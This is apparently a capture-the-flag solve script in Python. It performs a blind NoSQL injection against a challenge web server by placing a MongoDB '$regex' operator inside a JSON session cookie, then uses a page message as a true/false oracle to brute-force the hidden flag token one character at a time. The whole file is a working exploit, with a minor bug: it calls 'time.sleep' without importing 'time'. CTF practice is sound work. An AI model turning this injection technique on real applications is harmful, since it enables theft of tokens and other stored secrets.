import requests
import json
import re
import string
#from utils.ctf.blind_sqli import blind_sqli

URL = "https://area51.chall.pwnoh.io/"

_chars = string.ascii_letters + string.digits + "_" + string.punctuation

def blind_sqli(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while True:
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except requests.exceptions.ConnectionError:  # really bad error handling
				time.sleep(1)
				break
		else:
			return val

def oracle(inject):
	resp = requests.get(
		URL,
		cookies={
		"session":
		json.dumps({
		"token": {
		"$regex": "^bctf\\{" + re.escape(inject)
		},
		"username": ""
		})
		}
	)
	return "We're working to make this site better! Come back later for an amazing Area51 experience" in resp.text

blind_sqli("{}", oracle)
